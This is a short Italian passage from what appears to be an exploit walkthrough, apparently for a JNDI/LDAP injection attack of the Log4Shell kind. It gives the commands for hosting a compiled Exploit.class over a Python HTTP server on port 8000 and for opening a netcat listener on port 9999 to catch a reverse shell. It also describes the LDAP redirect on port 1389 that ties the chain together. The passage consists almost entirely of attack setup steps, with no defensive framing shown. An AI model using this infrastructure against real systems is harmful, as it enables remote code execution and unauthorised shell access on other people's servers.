Hosting HTTP & Listener
Azione

Terminale A (Web Server):

python3 -m http.server 8000

(Deve contenere Exploit.class)

Terminale B (Listener Finale):

nc -lnvp 9999
Spiegazione

Ora abbiamo l'infrastruttura completa:

  • LDAP (1389): Per fare il redirect.
  • HTTP (8000): Per consegnare il file .class compilato.
  • Netcat (9999): Per ricevere la connessione finale (la shell).

Nota per te: Serve ordine mentale, servono 3 terminali aperti contemporaneamente.
